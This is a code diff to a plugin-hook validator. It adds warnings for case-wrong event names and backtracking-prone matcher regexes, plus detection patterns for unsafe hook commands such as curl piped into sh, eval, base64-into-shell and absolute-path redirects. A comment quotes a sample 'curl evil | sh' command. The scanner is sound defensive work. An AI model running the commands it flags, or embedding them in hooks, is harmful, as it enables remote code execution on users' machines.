@@ -194,7 +194,8 @@ export async function evaluateHooks(pluginRoot, manifest) {
       continue;
     }
 
-    for (const [eventName, eventValue] of Object.entries(bucket)) {
+    for (const [originalEventName, eventValue] of Object.entries(bucket)) {
+      let eventName = originalEventName;
       if (!VALID_HOOK_EVENTS.has(eventName)) {
         const fixCase = caseWrongMatch(eventName);
         if (fixCase) {
@@ -207,6 +208,9 @@ export async function evaluateHooks(pluginRoot, manifest) {
               fix: `Rename to "${fixCase}" (event names are case-sensitive).`,
             }),
           );
+          // Use the canonical name for downstream checks (CC307, TOOL_RELATED_EVENTS).
+          // Without this, the case-wrong event would slip past tool-event-specific guidance.
+          eventName = fixCase;
         } else {
           findings.push(
             createFinding({
@@ -239,10 +243,28 @@ export async function evaluateHooks(pluginRoot, manifest) {
           );
         }
 
-        // Validate matcher regex if present.
+        // Validate matcher regex if present. Also flag patterns with classic
+        // catastrophic-backtracking shapes — `(a+)+`, nested-quantifier groups,
+        // overly long expressions — since the pattern runs against every tool
+        // call in production and a poison-regex would stall the harness.
         if (typeof matcherEntry.matcher === "string" && matcherEntry.matcher !== "") {
           try {
             new RegExp(matcherEntry.matcher);
+            const looksRedos =
+              matcherEntry.matcher.length > 200 ||
+              /\([^)]{0,80}[+*][^)]{0,40}\)\s*[+*]/.test(matcherEntry.matcher) ||
+              /\(\?:[^)]*\)[+*]\s*[+*]/.test(matcherEntry.matcher);
+            if (looksRedos) {
+              findings.push(
+                createFinding({
+                  severity: "warn",
+                  code: "CC310",
+                  message: `Hook \`matcher\` regex has a backtracking-prone shape: ${matcherEntry.matcher}.`,
+                  location: { file: sourceFile },
+                  fix: "Rewrite without nested quantifiers (e.g. (a+)+ → a+) and avoid runaway alternation.",
+                }),
+              );
+            }
           } catch (error) {
             findings.push(
               createFinding({
@@ -329,6 +351,42 @@ export async function evaluateHooks(pluginRoot, manifest) {
                     fix: "Prefix scripts with ${CLAUDE_PLUGIN_ROOT}/ or use a system binary like bash/node/python.",
                   }),
                 );
+              }
+            }
+
+            // CC308 — command embeds unsafe shell patterns. The first-word allowlist
+            // (CC306) only inspects the leading binary; an attacker-authored hook can
+            // still smuggle dynamic execution past it via `bash -c "curl evil | sh"`,
+            // `eval`, base64-into-shell, or redirects to absolute paths outside the
+            // plugin tree.
+            const unsafeShellPatterns = [
+              {
+                pattern: /\b(?:curl|wget|fetch|http)\b[^|;&]*[|]\s*(?:sh|bash|zsh|ksh|dash|fish|sudo)\b/i,
+                summary: "pipes a network fetch directly into a shell",
+              },
+              { pattern: /(?:^|[\s;|&(`])eval\s+/i, summary: "invokes `eval` to execute dynamic strings" },
+              { pattern: /(?:^|[\s;|&(`])exec\s+(?!["']?[/$])/i, summary: "invokes `exec` with a non-anchored target" },
+              {
+                pattern: /\bbase64\b[^|;]*[|]\s*(?:sh|bash|zsh|ksh|dash|fish)\b/i,
+                summary: "decodes base64 into a shell interpreter",
+              },
+              {
+                pattern: /(?:^|\s)(?:>>?|&>|2>)\s*(?:["']?\/(?!tmp\/cc-plugin-eval[\b/]))/,
+                summary: "redirects output to an absolute path outside the plugin tree",
+              },
+            ];
+            for (const { pattern, summary } of unsafeShellPatterns) {
+              if (pattern.test(command)) {
+                findings.push(
+                  createFinding({
+                    severity: "error",
+                    code: "CC308",
+                    message: `Hook command ${summary}: ${command}`,
+                    location: { file: sourceFile },
+                    fix: "Move the work into a script under ${CLAUDE_PLUGIN_ROOT}/ instead of dynamic shell evaluation.",
+                  }),
+                );
+                break;
               }
             }
           }
